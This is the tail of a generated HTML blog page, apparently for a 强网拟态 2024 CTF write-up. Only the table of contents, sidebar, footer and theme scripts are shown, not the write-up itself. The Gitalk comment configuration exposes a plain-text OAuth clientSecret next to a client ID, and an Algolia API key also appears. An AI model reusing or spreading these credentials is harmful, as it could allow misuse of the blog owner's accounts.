+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#capoo-一血">capoo (一血)</a></li>
+        <li><a href="#ez_picker">ez_picker</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#xor">xor</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#ezflag">ezflag</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">pwn</a>
+      <ul>
+        <li><a href="#signin-revenge">signin revenge</a>
+          <ul>
+            <li><a href="#题目libc环境">题目libc环境</a></li>
+            <li><a href="#orw">ORW</a></li>
+          </ul>
+        </li>
+        <li><a href="#signin">signin</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "强网拟态 2024",
+          url: "http:\/\/localhost:1313\/post\/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2024\/",
+          description: "强网拟态 2024 Writeup",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
